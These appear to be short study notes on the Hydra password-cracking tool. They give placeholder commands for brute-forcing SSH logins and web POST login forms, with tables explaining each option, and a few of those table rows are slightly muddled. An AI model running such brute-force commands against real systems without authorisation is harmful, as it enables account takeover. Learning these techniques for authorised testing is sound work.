# Hydra

**SSH**

`hydra -l <username> -P <full path to pass> <ip> -s 22 -t 4 ssh`

| Option | Description                            |
| ------ | -------------------------------------- |
| -l     | is for the username                    |
| -P     | Use a list of passwords                |
| -t     | specifies the number of threads to use |

**Post Web Form**

We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, of simply view the source code.

Below is an example Hydra command to brute force a POST login form.

`hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect" -V`

| Option         | Description                                           |
| -------------- | ----------------------------------------------------- |
| -l             | Single username                                       |
| -P             | indicates use the following password list             |
| http-post-form | indicates the type of form (post)                     |
| /login url     | the login page URL                                    |
| :username      | the form field where the username is entered          |
| ^USER^         | tells Hydra to use the username                       |
| password       | the form field where the password is entered          |
| ^PASS^         | tells Hydra to use the password list supplied earlier |
| Login          | indicates to Hydra the Login failed message           |
| Login failed   | is the login failure message that the form returns    |
| F=incorrect    | If this word appears on the page, its incorrect       |
| -V             | verborse output for every attempt                     |
